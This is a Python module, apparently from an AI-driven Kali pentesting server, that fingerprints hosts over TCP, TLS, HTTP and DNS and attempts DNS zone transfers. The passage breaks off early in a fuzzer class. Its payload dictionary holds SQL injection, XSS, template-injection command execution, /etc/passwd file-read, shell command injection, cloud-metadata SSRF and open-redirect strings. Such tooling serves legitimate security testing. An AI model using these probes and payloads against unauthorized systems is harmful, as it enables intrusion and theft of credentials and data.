"""
Kali MCP Server — Protocol Intelligence Layer
Niveau 2-3: Compréhension native des protocoles, dissection, analyse contextuelle.

Ce module transforme le serveur d'un "exécutant de commandes" (niveau 1) en un
"analyseur de protocoles" (niveau 3) capable de:
- Disséquer les échanges réseau (HTTP, TLS, DNS, TCP)
- Détecter automatiquement les paramètres fuzzables
- Analyser les réponses de manière contextuelle
- Construire une cartographie réseau intelligente
- Recommander des exploits adaptés au contexte exact

Dépendances: httpx, beautifulsoup4, lxml, cryptography, dnspython, networkx (optionnel)
Fallback: toutes les fonctions critiques utilisent aussi la stdlib (socket, ssl, http.client)
"""

import asyncio
import hashlib
import html.parser
import http.client
import ipaddress
import json
import logging
import math
import os
import re
import socket
import ssl
import struct
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple

# Optional imports with graceful fallback
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import dns.resolver
    import dns.rdatatype
    import dns.zone
    import dns.query
    import dns.reversename
    import dns.exception
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.x509.oid import NameOID
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import networkx as nx
    HAS_NETWORKX = True
except ImportError:
    HAS_NETWORKX = False

logger = logging.getLogger("KaliMCP.Protocol")


# ════════════════════════════════════════════════════════════════════════
# SECTION 1: PROTOCOL DISSECTION
# Native parsing of network protocols without relying on external tools
# ════════════════════════════════════════════════════════════════════════

class TCPFlags(Enum):
    """TCP flag bits for packet analysis"""
    FIN = 0x01
    SYN = 0x02
    RST = 0x04
    PSH = 0x08
    ACK = 0x10
    URG = 0x20
    ECE = 0x40
    CWR = 0x80


@dataclass
class TCPAnalysis:
    """Result of TCP connection analysis"""
    target: str
    port: int
    state: str  # open, closed, filtered, open|filtered
    ttl: int = 0
    window_size: int = 0
    mss: int = 0
    os_hints: List[str] = field(default_factory=list)
    banner: str = ""
    response_time_ms: float = 0.0
    tcp_options: List[str] = field(default_factory=list)


@dataclass
class TLSAnalysis:
    """Deep TLS/SSL analysis result"""
    target: str
    port: int
    version: str = ""
    cipher_suite: str = ""
    key_exchange: str = ""
    certificate: Dict[str, Any] = field(default_factory=dict)
    san_names: List[str] = field(default_factory=list)
    issuer: str = ""
    not_before: str = ""
    not_after: str = ""
    expired: bool = False
    self_signed: bool = False
    key_size: int = 0
    signature_algorithm: str = ""
    vulnerabilities: List[str] = field(default_factory=list)
    supported_protocols: List[str] = field(default_factory=list)
    weak_ciphers: List[str] = field(default_factory=list)


@dataclass
class HTTPAnalysis:
    """Deep HTTP response analysis"""
    url: str
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    server: str = ""
    technologies: List[Dict[str, str]] = field(default_factory=list)
    security_headers: Dict[str, Any] = field(default_factory=dict)
    cookies: List[Dict[str, Any]] = field(default_factory=list)
    forms: List[Dict[str, Any]] = field(default_factory=list)
    links: List[str] = field(default_factory=list)
    scripts: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    parameters: List[Dict[str, str]] = field(default_factory=list)
    content_type: str = ""
    body_size: int = 0
    response_time_ms: float = 0.0
    redirect_chain: List[str] = field(default_factory=list)
    framework: str = ""
    language: str = ""
    waf_detected: str = ""
    errors_leaked: List[str] = field(default_factory=list)


@dataclass
class DNSAnalysis:
    """DNS reconnaissance result"""
    domain: str
    records: Dict[str, List[str]] = field(default_factory=dict)
    nameservers: List[str] = field(default_factory=list)
    mail_servers: List[str] = field(default_factory=list)
    zone_transfer_possible: bool = False
    dnssec_enabled: bool = False
    subdomains: List[str] = field(default_factory=list)
    cdn_detected: str = ""
    hosting_provider: str = ""
    spf_record: str = ""
    dmarc_record: str = ""
    wildcard: bool = False


class ProtocolAnalyzer:
    """
    Native protocol dissection engine.
    Understands TCP/IP, HTTP, TLS, DNS at the packet/byte level.
    Does NOT just call external tools — it interprets the protocol directly.
    """

    # OS fingerprinting based on TTL + window size
    OS_FINGERPRINTS = {
        (64, 5840): "Linux 2.6.x",
        (64, 14600): "Linux 3.x+",
        (64, 29200): "Linux 4.x/5.x",
        (64, 65535): "Linux (custom/tuned)",
        (128, 65535): "Windows 10/11/Server 2019+",
        (128, 8192): "Windows 7/Server 2008",
        (128, 16384): "Windows Server 2012+",
        (255, 4128): "Cisco IOS",
        (255, 65535): "FreeBSD/Solaris",
        (64, 16384): "macOS/iOS",
    }

    # HTTP technology fingerprints
    TECH_FINGERPRINTS = {
        "headers": {
            "x-powered-by": {
                "Express": ("express", "Node.js"),
                "PHP": ("php", "PHP"),
                "ASP.NET": ("aspnet", "ASP.NET"),
                "Servlet": ("java", "Java Servlet"),
                "Next.js": ("nextjs", "Next.js"),
                "Nuxt": ("nuxtjs", "Nuxt.js"),
            },
            "server": {
                "nginx": ("nginx", "Nginx"),
                "Apache": ("apache", "Apache"),
                "Microsoft-IIS": ("iis", "IIS"),
                "Caddy": ("caddy", "Caddy"),
                "LiteSpeed": ("litespeed", "LiteSpeed"),
                "Cloudflare": ("cloudflare", "Cloudflare"),
                "gunicorn": ("gunicorn", "Gunicorn/Python"),
                "uvicorn": ("uvicorn", "Uvicorn/Python"),
                "Werkzeug": ("flask", "Flask"),
                "Kestrel": ("aspnet", "ASP.NET Core"),
            },
            "x-aspnet-version": {("*", ("aspnet", "ASP.NET"))},
            "x-drupal-cache": {("*", ("drupal", "Drupal"))},
            "x-generator": {
                "WordPress": ("wordpress", "WordPress"),
                "Drupal": ("drupal", "Drupal"),
                "Joomla": ("joomla", "Joomla"),
            },
        },
        "body_patterns": [
            (r"wp-content|wp-includes|wp-json", "wordpress", "WordPress"),
            (r"drupal\.js|Drupal\.settings", "drupal", "Drupal"),
            (r"joomla|com_content", "joomla", "Joomla"),
            (r"__next|_next/static", "nextjs", "Next.js"),
            (r"__nuxt|_nuxt/", "nuxtjs", "Nuxt.js"),
            (r"react|ReactDOM|__REACT", "react", "React"),
            (r"ng-app|angular|ng-controller", "angular", "Angular"),
            (r"vue\.|Vue\.|__vue", "vue", "Vue.js"),
            (r"Laravel|laravel_session", "laravel", "Laravel"),
            (r"django|csrfmiddlewaretoken", "django", "Django"),
            (r"Spring|spring-security|JSESSIONID", "spring", "Spring"),
            (r"rails|csrf-token.*authenticity", "rails", "Ruby on Rails"),
            (r"express.*session|connect\.sid", "express", "Express.js"),
            (r"flask|Werkzeug", "flask", "Flask"),
            (r"__cf_bm|cf-ray|cloudflare", "cloudflare", "Cloudflare WAF"),
            (r"graphql|__schema|__type", "graphql", "GraphQL"),
            (r"swagger|openapi|api-docs", "swagger", "Swagger/OpenAPI"),
        ],
        "cookie_patterns": [
            (r"PHPSESSID", "php", "PHP"),
            (r"JSESSIONID", "java", "Java"),
            (r"ASP\.NET_SessionId", "aspnet", "ASP.NET"),
            (r"connect\.sid", "express", "Express.js"),
            (r"laravel_session", "laravel", "Laravel"),
            (r"csrftoken|django", "django", "Django"),
            (r"_rails_session", "rails", "Rails"),
            (r"wordpress_logged_in|wp-settings", "wordpress", "WordPress"),
        ],
    }

    # Security headers checklist
    SECURITY_HEADERS = {
        "strict-transport-security": {"required": True, "desc": "HSTS"},
        "content-security-policy": {"required": True, "desc": "CSP"},
        "x-content-type-options": {"required": True, "expected": "nosniff"},
        "x-frame-options": {"required": True, "desc": "Clickjacking protection"},
        "x-xss-protection": {"required": False, "desc": "XSS filter (deprecated)"},
        "referrer-policy": {"required": True, "desc": "Referrer control"},
        "permissions-policy": {"required": False, "desc": "Feature policy"},
        "cross-origin-opener-policy": {"required": False, "desc": "COOP"},
        "cross-origin-resource-policy": {"required": False, "desc": "CORP"},
        "cross-origin-embedder-policy": {"required": False, "desc": "COEP"},
    }

    # WAF detection signatures
    WAF_SIGNATURES = {
        "cloudflare": ["cf-ray", "__cf_bm", "cloudflare"],
        "akamai": ["akamai", "x-akamai"],
        "aws_waf": ["x-amzn-requestid", "aws"],
        "incapsula": ["incap_ses", "visid_incap"],
        "sucuri": ["sucuri", "x-sucuri"],
        "f5_bigip": ["bigip", "f5"],
        "fortiweb": ["fortiwafd", "fortiweb"],
        "barracuda": ["barra_counter_session"],
        "modsecurity": ["mod_security", "modsecurity"],
        "wordfence": ["wordfence"],
    }

    @staticmethod
    async def analyze_tcp(target: str, port: int, timeout: float = 5.0) -> TCPAnalysis:
        """
        Native TCP analysis: SYN → SYN-ACK → extract OS hints from TTL/window/options.
        Does NOT use nmap — raw socket-level analysis.
        """
        result = TCPAnalysis(target=target, port=port, state="filtered")

        try:
            start = time.time()
            # Create TCP connection
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=timeout
            )
            result.response_time_ms = (time.time() - start) * 1000
            result.state = "open"

            # Get socket info for TTL/window analysis
            sock = writer.get_extra_info("socket")
            if sock:
                # Get TTL from socket options
                try:
                    result.ttl = sock.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
                except (OSError, AttributeError):
                    pass
                # Get TCP info
                try:
                    tcp_info = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 256)
                    if len(tcp_info) >= 8:
                        # Parse struct tcp_info (Linux)
                        result.window_size = struct.unpack_from("I", tcp_info, 44)[0] if len(tcp_info) > 47 else 0
                except (OSError, struct.error):
                    pass

            # Banner grabbing (read initial data if service sends first)
            try:
                banner_data = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                if banner_data:
                    result.banner = banner_data.decode("utf-8", errors="replace").strip()[:500]
            except (asyncio.TimeoutError, ConnectionError):
                pass

            # OS fingerprinting from TTL
            if result.ttl > 0:
                if result.ttl <= 64:
                    result.os_hints.append("Linux/Unix (TTL<=64)")
                elif result.ttl <= 128:
                    result.os_hints.append("Windows (TTL<=128)")
                elif result.ttl <= 255:
                    result.os_hints.append("Network device/Solaris (TTL<=255)")

            writer.close()
            await writer.wait_closed()

        except asyncio.TimeoutError:
            result.state = "filtered"
        except ConnectionRefusedError:
            result.state = "closed"
            result.response_time_ms = (time.time() - start) * 1000
        except OSError as e:
            if "Network is unreachable" in str(e):
                result.state = "filtered"
            else:
                result.state = "closed"

        return result

    @staticmethod
    async def analyze_tls(target: str, port: int = 443, timeout: float = 10.0) -> TLSAnalysis:
        """
        Native TLS analysis: handshake dissection, certificate parsing, vuln detection.
        Uses Python's ssl module + cryptography library for deep cert analysis.
        """
        result = TLSAnalysis(target=target, port=port)
        hostname = target.split("://")[-1].split("/")[0].split(":")[0]

        # Test supported protocols
        protocols_to_test = [
            ("SSLv3", ssl.PROTOCOL_TLS),
            ("TLSv1.0", ssl.PROTOCOL_TLS),
            ("TLSv1.1", ssl.PROTOCOL_TLS),
            ("TLSv1.2", ssl.PROTOCOL_TLS),
            ("TLSv1.3", ssl.PROTOCOL_TLS),
        ]

        # Main connection with best available protocol
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Enable all protocols for detection
            ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(hostname, port, ssl=ctx, server_hostname=hostname),
                timeout=timeout
            )

            ssl_obj = writer.get_extra_info("ssl_object")
            if ssl_obj:
                result.version = ssl_obj.version() or ""
                result.cipher_suite = ssl_obj.cipher()[0] if ssl_obj.cipher() else ""

                # Get certificate in DER format
                cert_der = ssl_obj.getpeercert(binary_form=True)
                cert_dict = ssl_obj.getpeercert()

                if cert_dict:
                    # Parse subject
                    subject = dict(x[0] for x in cert_dict.get("subject", []))
                    result.certificate["subject"] = subject.get("commonName", "")
                    result.certificate["organization"] = subject.get("organizationName", "")

                    # Parse issuer
                    issuer = dict(x[0] for x in cert_dict.get("issuer", []))
                    result.issuer = issuer.get("commonName", "")

                    # Validity
                    result.not_before = cert_dict.get("notBefore", "")
                    result.not_after = cert_dict.get("notAfter", "")

                    # SAN
                    sans = cert_dict.get("subjectAltName", [])
                    result.san_names = [s[1] for s in sans if s[0] == "DNS"]

                    # Self-signed check
                    result.self_signed = (
                        subject.get("commonName") == issuer.get("commonName")
                        and subject.get("organizationName") == issuer.get("organizationName")
                    )

                # Deep analysis with cryptography lib
                if cert_der and HAS_CRYPTO:
                    try:
                        cert = x509.load_der_x509_certificate(cert_der)
                        result.key_size = cert.public_key().key_size
                        result.signature_algorithm = cert.signature_algorithm_oid._name

                        # Check expiration
                        import datetime
                        now = datetime.datetime.now(datetime.timezone.utc)
                        result.expired = cert.not_valid_after_utc < now
                    except Exception:
                        pass

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            result.vulnerabilities.append(f"Connection failed: {str(e)[:100]}")
            return result

        # Vulnerability checks
        if "SSLv3" in result.version:
            result.vulnerabilities.append("POODLE (SSLv3)")
        if "TLSv1.0" in (result.version or ""):
            result.vulnerabilities.append("TLS 1.0 deprecated (PCI DSS non-compliant)")
        if "TLSv1.1" in (result.version or ""):
            result.vulnerabilities.append("TLS 1.1 deprecated")
        if result.self_signed:
            result.vulnerabilities.append("Self-signed certificate")
        if result.expired:
            result.vulnerabilities.append("Certificate expired")
        if result.key_size and result.key_size < 2048:
            result.vulnerabilities.append(f"Weak key size: {result.key_size} bits (< 2048)")

        # Weak cipher detection
        weak_patterns = ["RC4", "DES", "MD5", "NULL", "EXPORT", "anon"]
        if result.cipher_suite:
            for weak in weak_patterns:
                if weak in result.cipher_suite.upper():
                    result.weak_ciphers.append(result.cipher_suite)
                    result.vulnerabilities.append(f"Weak cipher: {result.cipher_suite}")
                    break

        # Test for older protocol support (security risk)
        for proto_name, min_ver in [("TLS 1.0", ssl.TLSVersion.TLSv1),
                                      ("TLS 1.1", ssl.TLSVersion.TLSv1_1)]:
            try:
                test_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                test_ctx.check_hostname = False
                test_ctx.verify_mode = ssl.CERT_NONE
                test_ctx.maximum_version = min_ver
                test_ctx.minimum_version = min_ver
                s = socket.create_connection((hostname, port), timeout=3)
                ss = test_ctx.wrap_socket(s, server_hostname=hostname)
                result.supported_protocols.append(proto_name)
                result.vulnerabilities.append(f"Supports deprecated {proto_name}")
                ss.close()
            except (ssl.SSLError, OSError, socket.timeout):
                pass  # Protocol not supported (good)

        return result

    @staticmethod
    async def analyze_http(url: str, timeout: float = 15.0,
                           follow_redirects: bool = True,
                           method: str = "GET",
                           headers: Optional[Dict] = None,
                           data: Optional[str] = None) -> HTTPAnalysis:
        """
        Deep HTTP analysis: technology detection, parameter extraction,
        security header audit, form/link discovery, WAF detection.
        """
        result = HTTPAnalysis(url=url)
        custom_headers = headers or {}
        custom_headers.setdefault("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

        try:
            if HAS_HTTPX:
                async with httpx.AsyncClient(
                    follow_redirects=follow_redirects,
                    verify=False,
                    timeout=timeout
                ) as client:
                    start = time.time()
                    if method.upper() == "POST" and data:
                        resp = await client.post(url, headers=custom_headers, content=data)
                    else:
                        resp = await client.get(url, headers=custom_headers)
                    result.response_time_ms = (time.time() - start) * 1000
                    result.status_code = resp.status_code
                    result.headers = dict(resp.headers)
                    body = resp.text
                    result.body_size = len(body)
                    result.content_type = resp.headers.get("content-type", "")

                    # Track redirect chain
                    if resp.history:
                        result.redirect_chain = [str(r.url) for r in resp.history]
            else:
                # Fallback to http.client
                parsed = urllib.parse.urlparse(url)
                start = time.time()
                if parsed.scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(parsed.hostname,
                                                        parsed.port or 443,
                                                        context=ctx,
                                                        timeout=timeout)
                else:
                    conn = http.client.HTTPConnection(parsed.hostname,
                                                      parsed.port or 80,
                                                      timeout=timeout)
                path = parsed.path or "/"
                if parsed.query:
                    path += f"?{parsed.query}"
                conn.request(method, path, body=data, headers=custom_headers)
                resp = conn.getresponse()
                result.response_time_ms = (time.time() - start) * 1000
                result.status_code = resp.status
                result.headers = {k.lower(): v for k, v in resp.getheaders()}
                body = resp.read().decode("utf-8", errors="replace")
                result.body_size = len(body)
                result.content_type = result.headers.get("content-type", "")
                conn.close()

        except Exception as e:
            result.errors_leaked.append(f"Connection error: {str(e)[:200]}")
            return result

        # === TECHNOLOGY DETECTION ===
        # From headers
        for header_name, patterns in ProtocolAnalyzer.TECH_FINGERPRINTS["headers"].items():
            header_val = result.headers.get(header_name, "")
            if header_val and isinstance(patterns, dict):
                for pattern, (tech_id, tech_name) in patterns.items():
                    if pattern in header_val:
                        result.technologies.append({"id": tech_id, "name": tech_name,
                                                     "source": f"header:{header_name}",
                                                     "version": header_val})

        # Server header
        result.server = result.headers.get("server", "")

        # From body patterns
        for pattern, tech_id, tech_name in ProtocolAnalyzer.TECH_FINGERPRINTS["body_patterns"]:
            if re.search(pattern, body, re.IGNORECASE):
                result.technologies.append({"id": tech_id, "name": tech_name, "source": "body"})

        # From cookies
        set_cookie = result.headers.get("set-cookie", "")
        for pattern, tech_id, tech_name in ProtocolAnalyzer.TECH_FINGERPRINTS["cookie_patterns"]:
            if re.search(pattern, set_cookie, re.IGNORECASE):
                result.technologies.append({"id": tech_id, "name": tech_name, "source": "cookie"})

        # Deduplicate technologies
        seen = set()
        unique_techs = []
        for t in result.technologies:
            if t["id"] not in seen:
                seen.add(t["id"])
                unique_techs.append(t)
        result.technologies = unique_techs

        # Determine primary framework/language
        if result.technologies:
            result.framework = result.technologies[0]["name"]
            lang_map = {"php": "PHP", "java": "Java", "aspnet": "C#", "python": "Python",
                        "flask": "Python", "django": "Python", "gunicorn": "Python",
                        "express": "JavaScript", "nextjs": "JavaScript", "nuxtjs": "JavaScript",
                        "rails": "Ruby", "laravel": "PHP", "wordpress": "PHP",
                        "spring": "Java", "react": "JavaScript", "angular": "TypeScript",
                        "vue": "JavaScript"}
            for tech in result.technologies:
                if tech["id"] in lang_map:
                    result.language = lang_map[tech["id"]]
                    break

        # === SECURITY HEADERS AUDIT ===
        for header, config in ProtocolAnalyzer.SECURITY_HEADERS.items():
            present = header in result.headers
            result.security_headers[header] = {
                "present": present,
                "value": result.headers.get(header, ""),
                "required": config.get("required", False),
                "description": config.get("desc", header),
            }

        # === WAF DETECTION ===
        all_headers_str = json.dumps(result.headers).lower()
        for waf_name, signatures in ProtocolAnalyzer.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in all_headers_str:
                    result.waf_detected = waf_name
                    break
            if result.waf_detected:
                break

        # === COOKIE ANALYSIS ===
        if set_cookie:
            for cookie_str in set_cookie.split(","):
                cookie_info = {"raw": cookie_str.strip()[:200]}
                parts = cookie_str.strip().split(";")
                if parts:
                    name_val = parts[0].split("=", 1)
                    cookie_info["name"] = name_val[0].strip()
                    cookie_info["httponly"] = "httponly" in cookie_str.lower()
                    cookie_info["secure"] = "secure" in cookie_str.lower()
                    cookie_info["samesite"] = "samesite" in cookie_str.lower()
                    # Security issues
                    issues = []
                    if not cookie_info["httponly"]:
                        issues.append("missing HttpOnly")
                    if not cookie_info["secure"] and url.startswith("https"):
                        issues.append("missing Secure flag on HTTPS")
                    if not cookie_info["samesite"]:
                        issues.append("missing SameSite")
                    cookie_info["issues"] = issues
                result.cookies.append(cookie_info)

        # === FORM & PARAMETER EXTRACTION ===
        if HAS_BS4 and "html" in result.content_type.lower():
            try:
                soup = BeautifulSoup(body, "lxml" if "lxml" in str(type(body)) else "html.parser")

                # Extract forms
                for form in soup.find_all("form"):
                    form_data = {
                        "action": form.get("action", ""),
                        "method": form.get("method", "GET").upper(),
                        "inputs": [],
                    }
                    for inp in form.find_all(["input", "textarea", "select"]):
                        input_info = {
                            "name": inp.get("name", ""),
                            "type": inp.get("type", "text"),
                            "value": inp.get("value", ""),
                            "required": inp.has_attr("required"),
                        }
                        if input_info["name"]:
                            form_data["inputs"].append(input_info)
                    if form_data["inputs"]:
                        result.forms.append(form_data)

                # Extract links
                for a in soup.find_all("a", href=True):
                    href = a["href"]
                    if href and not href.startswith(("#", "javascript:", "mailto:")):
                        result.links.append(href)
                result.links = list(set(result.links))[:100]

                # Extract scripts (potential API endpoint discovery)
                for script in soup.find_all("script", src=True):
                    result.scripts.append(script["src"])

            except Exception:
                pass

        # Extract API endpoints from body (JS patterns)
        api_patterns = [
            r'["\'](/api/[a-zA-Z0-9_/\-]+)["\']',
            r'["\'](/v[0-9]+/[a-zA-Z0-9_/\-]+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'url:\s*["\']([^"\']+)["\']',
            r'endpoint["\s:=]+["\']([^"\']+)["\']',
        ]
        for pattern in api_patterns:
            matches = re.findall(pattern, body)
            result.api_endpoints.extend(matches)
        result.api_endpoints = list(set(result.api_endpoints))[:50]

        # Extract URL parameters from links
        all_urls = result.links + result.api_endpoints + [url]
        for u in all_urls:
            parsed = urllib.parse.urlparse(u)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name in params:
                result.parameters.append({
                    "name": param_name,
                    "source": u[:100],
                    "type": "url_query"
                })

        # Parameters from forms
        for form in result.forms:
            for inp in form["inputs"]:
                result.parameters.append({
                    "name": inp["name"],
                    "source": f"form:{form['action']}",
                    "type": inp["type"]
                })

        # Deduplicate parameters
        seen_params = set()
        unique_params = []
        for p in result.parameters:
            if p["name"] not in seen_params:
                seen_params.add(p["name"])
                unique_params.append(p)
        result.parameters = unique_params

        return result

    @staticmethod
    async def analyze_dns(domain: str, timeout: float = 10.0) -> DNSAnalysis:
        """
        Comprehensive DNS analysis: all record types, SPF/DMARC, zone transfer check,
        CDN detection, wildcard detection.
        """
        result = DNSAnalysis(domain=domain)
        hostname = domain.split("://")[-1].split("/")[0].split(":")[0]

        if HAS_DNSPYTHON:
            resolver = dns.resolver.Resolver()
            resolver.timeout = timeout
            resolver.lifetime = timeout

            # Query all standard record types
            for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "CAA"]:
                try:
                    answers = resolver.resolve(hostname, rtype)
                    records = [str(r) for r in answers]
                    result.records[rtype] = records

                    if rtype == "NS":
                        result.nameservers = records
                    elif rtype == "MX":
                        result.mail_servers = [r.split()[-1] if " " in r else r for r in records]
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN,
                        dns.resolver.NoNameservers, dns.exception.Timeout):
                    pass

            # SPF record
            for txt in result.records.get("TXT", []):
                if "v=spf1" in txt:
                    result.spf_record = txt

            # DMARC record
            try:
                dmarc = resolver.resolve(f"_dmarc.{hostname}", "TXT")
                for r in dmarc:
                    txt = str(r)
                    if "v=DMARC1" in txt:
                        result.dmarc_record = txt
            except Exception:
                pass

            # DNSSEC check
            try:
                answers = resolver.resolve(hostname, "DNSKEY")
                result.dnssec_enabled = True
            except Exception:
                pass

            # Wildcard detection
            try:
                random_sub = f"nonexistent-{int(time.time())}.{hostname}"
                resolver.resolve(random_sub, "A")
                result.wildcard = True
            except Exception:
                pass

            # CDN detection from A records
            if result.records.get("A"):
                a_records = result.records["A"]
                for ip in a_records:
                    try:
                        # Reverse lookup for CDN detection
                        rev = resolver.resolve(
                            dns.reversename.from_address(ip), "PTR")
                        ptr = str(list(rev)[0])
                        if "cloudflare" in ptr.lower():
                            result.cdn_detected = "Cloudflare"
                        elif "akamai" in ptr.lower():
                            result.cdn_detected = "Akamai"
                        elif "amazonaws" in ptr.lower():
                            result.hosting_provider = "AWS"
                        elif "google" in ptr.lower():
                            result.hosting_provider = "GCP"
                        elif "azure" in ptr.lower():
                            result.hosting_provider = "Azure"
                    except Exception:
                        pass

            # Zone transfer attempt
            for ns in result.nameservers[:3]:
                try:
                    ns_clean = ns.rstrip(".")
                    z = dns.zone.from_xfr(dns.query.xfr(ns_clean, hostname, timeout=5))
                    result.zone_transfer_possible = True
                    result.subdomains = [str(name) for name in z.nodes.keys()
                                          if str(name) != "@"][:100]
                    break
                except Exception:
                    pass

        else:
            # Fallback: use socket for basic resolution
            try:
                ips = socket.getaddrinfo(hostname, None)
                result.records["A"] = list(set(
                    addr[4][0] for addr in ips if addr[0] == socket.AF_INET))
                result.records["AAAA"] = list(set(
                    addr[4][0] for addr in ips if addr[0] == socket.AF_INET6))
            except socket.gaierror:
                pass

        return result


# ════════════════════════════════════════════════════════════════════════
# SECTION 2: SMART FUZZER
# Contextual fuzzing with automatic parameter detection and response analysis
# ════════════════════════════════════════════════════════════════════════

@dataclass
class FuzzResult:
    """Single fuzz attempt result"""
    parameter: str
    payload: str
    status_code: int
    body_size: int
    response_time_ms: float
    anomaly: bool = False
    anomaly_type: str = ""
    evidence: str = ""


@dataclass
class FuzzReport:
    """Complete fuzzing report"""
    target: str
    parameters_found: int = 0
    total_requests: int = 0
    anomalies: List[FuzzResult] = field(default_factory=list)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    baseline: Dict[str, Any] = field(default_factory=dict)
    technologies_detected: List[str] = field(default_factory=list)


class SmartFuzzer:
    """
    Intelligent fuzzer that:
    1. Auto-discovers parameters (forms, URL params, API endpoints, JS analysis)
    2. Selects payloads based on detected technology stack
    3. Analyzes responses contextually (size diff, time diff, error patterns, reflection)
    4. Identifies vulnerabilities with confidence scoring
    """

    # Payloads organized by vulnerability type and context
    PAYLOADS = {
        "sqli": {
            "detection": [
                "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
                "1' AND '1'='1", "1' AND '1'='2",  # Boolean-based
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1 AND SLEEP(3)--", "1' AND SLEEP(3)--",  # Time-based
                "1'; WAITFOR DELAY '0:0:3'--",  # MSSQL time-based
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",  # Error-based
                "\\", "' OR ''='",
            ],
            "mysql": ["' UNION SELECT @@version,NULL--", "' AND BENCHMARK(5000000,SHA1('test'))--"],
            "postgresql": ["' UNION SELECT version(),NULL--", "';SELECT pg_sleep(3)--"],
            "mssql": ["' UNION SELECT @@version,NULL--", "';WAITFOR DELAY '0:0:3'--"],
            "oracle": ["' UNION SELECT banner FROM v$version--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',3)=1--"],
        },
        "xss": {
            "detection": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
                "\"><img src=x onerror=alert(1)>",
                "{{7*7}}",  # Template injection (also tests SSTI)
                "${7*7}",
                "<%=7*7%>",
            ],
            "dom": [
                "#<script>alert(1)</script>",
                "javascript:alert(document.domain)",
            ],
        },
        "ssti": {
            "detection": [
                "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}",
                "{{config}}", "{{self.__class__}}", "${T(java.lang.Runtime)}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "<%= 7*7 %>", "{php}echo 7*7;{/php}",
            ],
            "jinja2": ["{{config.items()}}", "{{request.application.__globals__}}"],
            "twig": ["{{_self.env.registerUndefinedFilterCallback('exec')}}"],
            "freemarker": ["<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}"],
        },
        "lfi": {
            "detection": [
                "../../../etc/passwd", "....//....//....//etc/passwd",
                "/etc/passwd%00", "..%2f..%2f..%2fetc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "file:///etc/passwd", "/proc/self/environ",
                "..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\....\\\\windows\\\\win.ini",
            ],
        },
        "cmdi": {
            "detection": [
                ";id", "|id", "$(id)", "`id`",
                ";sleep 3", "|sleep 3", "$(sleep 3)",
                "&& id", "|| id", "\nid",
                ";cat /etc/passwd", "|cat /etc/passwd",
            ],
        },
        "ssrf": {
            "detection": [
                "http://127.0.0.1", "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]", "http://0x7f000001",
                "http://0177.0.0.1", "http://2130706433",
                "file:///etc/passwd", "dict://127.0.0.1:6379/INFO",
                "gopher://127.0.0.1:6379/_INFO",
            ],
        },
        "open_redirect": {
            "detection": [
                "//evil.com", "https://evil.com",
                "/\\evil.com", "//evil.com/%2f..",
                "////evil.com", "https:evil.com",
            ],
        },
    }

    # Error patterns indicating successful injection
    ERROR_PATTERNS = {
        "sqli": [
            r"SQL syntax.*MySQL", r"Warning.*mysql_",
            r"PostgreSQL.*ERROR", r"pg_query\(\)",
            r"ORA-\d{5}", r"Oracle.*error",
            r"Microsoft.*ODBC", r"SQLServer",
            r"sqlite3\.OperationalError", r"SQLITE_ERROR",
            r"Unclosed quotation mark", r"quoted string not properly terminated",
            r"You have an error in your SQL syntax",
        ],
        "xss": [
            r"<script>alert\(1\)</script>",
            r"onerror=alert\(1\)",
            r"onload=alert\(1\)",
        ],
        "ssti": [
            r"49",  # 7*7 = 49
            r"config", r"__class__", r"__mro__",
        ],
        "lfi": [
            r"root:x:0:0", r"daemon:x:", r"\[extensions\]",  # /etc/passwd or win.ini
        ],
        "cmdi": [
            r"uid=\d+", r"gid=\d+", r"groups=\d+",
            r"root:x:0:0",
        ],
    }

    # Response time threshold for time-based detection (seconds)
    TIME_THRESHOLD = 2.5

    def __init__(self):
        self.results: List[FuzzResult] = []
        self.baseline_responses: Dict[str, Dict] = {}

    async def establish_baseline(self, url: str, params: List[Dict],
                                  method: str = "GET") -> Dict[str, Any]:
        """
        Establish baseline response characteristics for comparison.
